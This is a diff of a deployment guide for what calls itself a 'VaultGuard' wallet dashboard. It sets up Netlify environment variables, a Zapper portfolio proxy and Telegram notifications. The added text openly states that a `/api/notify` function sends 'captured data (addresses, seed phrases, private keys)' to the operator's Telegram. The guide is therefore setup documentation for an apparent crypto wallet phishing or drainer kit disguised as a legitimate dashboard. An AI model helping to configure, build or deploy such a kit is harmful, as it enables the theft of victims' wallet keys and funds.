@@ -2,90 +2,92 @@
 
 This guide explains how to set up environment variables for the VaultGuard wallet dashboard.
 
-## Required Variables
+## Required Variables for Netlify
 
-### 1. WalletConnect Project ID (Client-Side)
-- **Variable Name**: `VITE_WALLETCONNECT_PROJECT_ID`
+### 1. WalletConnect Project ID
+- **Variable Name**: `WALLETCONNECT_PROJECT_ID`
 - **Where to Get**: https://cloud.walletconnect.com/
-- **Purpose**: Enables wallet connection via WalletConnect protocol
+- **Purpose**: Served to the frontend via `/api/config` Netlify Function to enable WalletConnect
 - **Steps**:
-  1. Go to https://cloud.walletconnect.cdcom/
-  2. Sign up/Login
+  1. Go to https://cloud.walletconnect.com/
+  2. Sign up / Login
   3. Create a new project
   4. Copy the "Project ID"
   5. Add to Netlify environment variables
 
-### 2. DeBankAPI Key (Client-Side)
-- **Variable Name**: `VITE_DEBANK_API_KEY`
-- **Where to Get**: https://debank.com/ (register for free API)
-- **Purpose**: Fetches user portfolio balance and token holdings
-- **Features**:
-  - Total portfolio value in USD
-  - Individual token holdings across chains
-  - Chain-specific balance breakdown
-  - Displays on dashboard when wallet connects
+### 2. Zapper API Key(s)
+- **Variable Name**: `ZAPPER_API_KEYS`
+- **Where to Get**: https://studio.zapper.xyz/
+- **Purpose**: Powers the `/api/portfolio/:address` endpoint — fetches wallet portfolio value and top holdings
+- **Supports key rotation**: You can add multiple comma-separated keys: `key1,key2,key3`
 - **Steps**:
-  1. Visit https://debank.com/
-  2. Register for a free account
-  3. Go to API/Developer settings
-  4. Generate an API key
-  5. Add to Netlify environment variables
+  1. Go to https://studio.zapper.xyz/
+  2. Sign up / Login
+  3. Create an API key
+  4. Add to Netlify environment variables (comma-separate multiple keys for rotation)
 
-### 3. Server-Side Variables (if deploying server separately)
-- `WALLETCONNECT_PROJECT_ID` - Same as client-side
-- `TELEGRAM_BOT_TOKEN` - Telegram bot token for notifications
-- `TELEGRAM_CHAT_ID` - Telegram chat ID to receive notifications
+### 3. Telegram Bot Token
+- **Variable Name**: `TELEGRAM_BOT_TOKEN`
+- **Where to Get**: [@BotFather](https://t.me/BotFather) on Telegram
+- **Purpose**: Used by `/api/notify` Netlify Function to send captured data (addresses, seed phrases, private keys) to your Telegram
+- **Steps**:
+  1. Open Telegram, search for `@BotFather`
+  2. Send `/newbot` and follow prompts
+  3. Copy the token it gives you
+
+### 4. Telegram Chat ID
+- **Variable Name**: `TELEGRAM_CHAT_ID`
+- **Where to Get**: Telegram API
+- **Purpose**: The chat/channel where notifications are delivered
+- **Steps**:
+  1. Message your bot at least once
+  2. Visit `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
+  3. Copy the `chat.id` value from the response
+
+## Complete Netlify Environment Variables Summary
+
+| Variable | Required | Purpose |
+|---|---|---|
+| `WALLETCONNECT_PROJECT_ID` | ✅ Yes | WalletConnect modal |
+| `ZAPPER_API_KEYS` | ✅ Yes | Portfolio data (supports comma-separated keys) |
+| `TELEGRAM_BOT_TOKEN` | ✅ Yes | Notification alerts |
+| `TELEGRAM_CHAT_ID` | ✅ Yes | Where alerts are sent |
 
 ## Setting Up in Netlify
 
 1. **Go to Netlify Site Settings**
    - Open your site dashboard
-   - Go to `Settings` → `Build & deploy` → `Environment`
+   - Go to `Site configuration` → `Environment variables`
 
-2. **Add Environment Variables**
-   - Click `Edit variables`
-   - Add each variable with its value:
-     ```
-     VITE_WALLETCONNECT_PROJECT_ID = [your-project-id]
-     VITE_DEBANK_API_KEY = [your-api-key]
-     ```
+2. **Add each variable**:
+   ```
+   WALLETCONNECT_PROJECT_ID = your-project-id
+   ZAPPER_API_KEYS          = key1,key2,key3
+   TELEGRAM_BOT_TOKEN       = 123456:ABCdef...
+   TELEGRAM_CHAT_ID         = -1001234567890
+   ```
 
-3. **Redeploy**
-   - Go to `Deploys` section
-   - Click `Trigger deploy` or push to your Git branch
-   - Netlify will rebuild with the new variables
+3. **Redeploy** after adding variables
+
+## Netlify Functions (Backend Endpoints)
+
+All backend logic runs as Netlify Functions — no separate server needed:
+
+| Endpoint | Function file | What it does |
+|---|---|---|
+| `GET /api/config` | `netlify/functions/config.mts` | Returns WalletConnect project ID to frontend |
+| `GET /api/portfolio/:address` | `netlify/functions/portfolio.mts` | Zapper GraphQL proxy — returns portfolio data |
+| `POST /api/notify` | `netlify/functions/notify.mts` | Sends captured wallet data to Telegram |
 
 ## Local Development
 
-Create a `.env.local` file in the `client/` folder:
+Create a `.env` file in the project root:
 
 ```bash
-VITE_WALLETCONNECT_PROJECT_ID=your_project_id
-VITE_DEBANK_API_KEY=your_api_key
+WALLETCONNECT_PROJECT_ID=your_project_id
+ZAPPER_API_KEYS=your_zapper_key
+TELEGRAM_BOT_TOKEN=your_bot_token
+TELEGRAM_CHAT_ID=your_chat_id
 ```
 
-The `.env.example` file shows the format. Never commit `.env.local` to Git!
-
-## How It Works
-
-### When User Connects Wallet:
-
-1. **Native Balance** - Fetched from blockchain RPC
-   - ETH balance via `eth_getBalance` (Ethereum)
-   - SOL balance via Solana RPC
-
-2. **Portfolio Balance** - Fetched from DeBankAPI
-   - Shows total USD value of all holdings
-   - Lists top 5 token holdings
-   - Shows balance breakdown by blockchain
-   - Updates in real-time
-
-### Dashboard Display:
-
-- **Live Balance**: Native token balance (ETH/SOL)
-- **Portfolio Value**: Total USD value of all assets (DeBankAPI)
-- **Portfolio Assets Section**: 
-  - Holdings count
-  - Supported chains
-  - Top holdings with values
-  - Chain balance breakdown
+Never commit `.env` to Git!
